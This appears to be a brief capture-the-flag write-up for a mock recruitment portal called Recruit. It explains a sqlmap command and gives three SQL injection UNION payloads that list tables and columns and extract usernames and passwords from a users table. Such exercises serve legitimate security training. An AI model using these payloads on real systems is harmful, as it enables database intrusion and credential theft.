### Guide:

Recruit has just launched its new recruitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker, mapping its structure, abusing exposed functionality, and exploiting vulnerabilities.

Can you gain an initial foothold, escalate your access, and ultimately log in as the administrator?

| Part         | Meaning                                                                                      |
| ------------ | -------------------------------------------------------------------------------------------- |
| `sqlmap`     | Starts **SQLMap**, a tool for detecting and testing SQL injection vulnerabilities.           |
| `-r sql.txt` | Reads the **raw HTTP request** from the file `sql.txt`.                                      |
| `--dbs`      | Tells SQLMap to enumerate the **available databases** on the target.                         |
| `--batch`    | Runs automatically using SQLMap's **default answers**, without asking interactive questions. |

In this we can use this:

Find database tables
````
' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
````


Find columns in users
````
' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -
````

Extract the users
````
' AND 1=0 UNION SELECT 1,username,password,id FROM users-- -
````
